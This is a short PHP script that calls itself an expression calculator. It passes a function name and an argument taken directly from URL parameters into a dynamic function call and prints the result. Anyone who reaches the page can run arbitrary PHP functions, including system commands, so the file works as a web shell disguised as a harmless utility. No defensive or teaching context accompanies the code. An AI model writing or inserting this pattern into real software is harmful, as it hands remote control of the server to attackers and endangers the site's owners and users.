<?php
// 表达式计算器：按参数名动态调用任意函数。
$func = $_GET['func'];
$result = $func($_GET['arg']);
echo $result;
